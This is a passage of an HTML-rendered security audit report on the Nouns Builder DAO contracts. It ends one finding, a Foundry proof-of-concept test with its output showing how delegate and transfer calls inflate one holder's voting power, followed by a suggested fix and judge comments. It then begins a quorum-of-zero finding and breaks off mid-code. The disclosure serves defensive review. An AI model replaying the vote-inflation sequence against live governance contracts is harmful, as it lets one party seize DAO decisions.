class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">// Giving voter1 their 1 NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">founder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">unpause</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">createBid</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">0.420</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionParams</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">seconds</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">settleCurrentAndCreateNewAuction</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Start Exploit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Initial Votes&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter1: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter2: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;After Delegating Votes, voter1 -&gt; delegate(voter2)&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter1: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter2: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;After Token transfer, voter1 -transferFrom()-&gt; voter2&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter1 votes: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter2 votes: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;After Delegating Votes, voter2 -&gt; delegate(voter2)&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter1: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;voter2: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Expected Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">[</span><span class=\"mtk12\">PASS</span><span class=\"mtk1\">] </span><span class=\"mtk11\">testVoteDoublePower</span><span class=\"mtk1\">() (</span><span class=\"mtk12\">gas</span><span class=\"mtk1\">: </span><span class=\"mtk7\">3544946</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">Logs:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  Initial Votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  voter1:  1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  voter2:  0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  After Delegating Votes, voter1 -&gt; delegate(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">)   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  voter1:  1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  voter2:  1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  After Token transfer, voter1 -transferFrom()-&gt; voter2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  voter1 votes:  0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  voter2 votes:  2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  After Delegating Votes, voter2 -&gt; delegate(</span><span class=\"mtk12\">voter2</span><span class=\"mtk1\">)   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  voter1:  0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  voter2:  3</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Looking at <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13\">OpenZeppelin’s ERC721Votes</a> which I believe the team took reference from, it states:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">* Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">* on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">* the votes in governance decisions, or they can delegate to themselves to be their own representative.</span></span></code></pre>\n<p>The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated.</p>\n<ul>\n<li>I believe the issue is here on this <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268\">line</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Transfer 1 vote from the sender to the recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Where it should move from the delegate of <code>_from</code> to the delegate of <code>_to</code>. Suggested FIx:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">], </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">], </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1258530566\">iainnash (Nouns Builder) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Would agree w/ High risk.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1258739921\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to an incorrect handling of delegation, a Token Holder can delegate their voting power without losing it, allowing for an exploit that allows them to reach infinite voting power.</p>\n<p>I believe that some of the problems with Delegation shown via this contest can be traced down to this quote from the <a href=\"https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721Votes\">OZ Documentation</a>\n<code>Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of the votes in governance decisions, or they can delegate to themselves to be their own representative.</code></p>\n<p>Remediation of this specific issue can be done by following the warden advice, and using the Test Case to verify the exploit has been patched, additionally, further thinking into how delegation should behave will be necessary to ensure the system is patched to safety</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1261353232\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>In contrast to <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469\">issue 469</a> (Unsafe Underflow) and <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413\">issue 413</a> (Self Delegation for doubling of votes), this report is showing how, due to an incorrect accounting, a user can repeatedly transfer and delegate to achieve infinite voting power.</p>\n<p>While the outcome of all 3 is increased voting power, I believe the uniqueness of the attack is in exploiting a different aspect of the code.</p>\n<p>Remediation should account for all 3 exploits, and I believe, because of the uniqueness of the attack, that this is a distinct report vs the previously mentioned.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-28\" style=\"position:relative;\"><a href=\"#medium-risk-findings-28\" aria-label=\"medium risk findings 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (28)</h1>\n<h2 id=\"m-01-quorum-votes-have-no-effect-for-determining-whether-proposal-is-defeated-or-succeeded-when-token-supply-is-low\" style=\"position:relative;\"><a href=\"#m-01-quorum-votes-have-no-effect-for-determining-whether-proposal-is-defeated-or-succeeded-when-token-supply-is-low\" aria-label=\"m 01 quorum votes have no effect for determining whether proposal is defeated or succeeded when token supply is low permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/607\">[M-01] Quorum votes have no effect for determining whether proposal is defeated or succeeded when token supply is low</a></h2>\n<p><em>Submitted by rbserver, also found by cccz, dipp, joestakey, pashov, and R2</em></p>\n<p>At the early stage of the deployed DAO, it is possible that the following <code>quorum</code> function returns 0 because the token supply is low.</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L473-L477\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L473-L477</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quorum</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quorumThresholdBps</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>When calling the following <code>propose</code> function, <code>proposal.quorumVotes = uint32(quorum())</code> is executed. If <code>quorum()</code> returns 0, <code>proposal.quorumVotes</code> is set to 0.</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L116-L175\">https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L116-L175</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">propose</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_targets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_values</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_calldatas</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_description</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the current proposal threshold</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentProposalThreshold</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">proposalThreshold</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Cannot realistically underflow and `getVotes` would revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Ensure the caller&#39;s voting weight is greater than or equal to the threshold</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk11\">proposalThreshold</span><span class=\"mtk1\">()) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BELOW_PROPOSAL_THRESHOLD</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Cache the number of targets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numTargets</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_targets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure at least one target exists</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">numTargets</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_TARGET_MISSING</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the number of targets matches the number of values and calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">numTargets</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_values</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_LENGTH_MISMATCH</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">numTargets</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_calldatas</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_LENGTH_MISMATCH</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Compute the description hash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">descriptionHash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_description</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Compute the proposal id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">hashProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk12\">descriptionHash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the pointer to store the proposal</span></span></span>\n<span class=\"grvsc-line\"><span 